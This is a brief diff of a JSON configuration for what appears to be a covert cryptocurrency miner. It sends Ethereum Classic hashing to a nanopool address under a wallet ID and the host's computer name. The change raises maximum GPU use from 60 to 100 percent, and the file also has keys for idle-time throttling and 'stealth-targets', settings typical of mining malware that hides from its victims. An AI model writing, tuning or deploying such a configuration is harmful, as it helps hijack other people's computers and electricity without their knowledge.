@@ -1,7 +1,7 @@
 {
     "url": "stratum://`0xA3f8E7A333765a647c357a06dA962711BdcEEdAb`.{COMPUTERNAME}@etc-eu1.nanopool.org:19999",
     "algo": "etchash",
-    "max-gpu": 60,
+    "max-gpu": 100,
     "idle-wait": 0,
     "idle-gpu": 70,
     "stealth-targets": "",
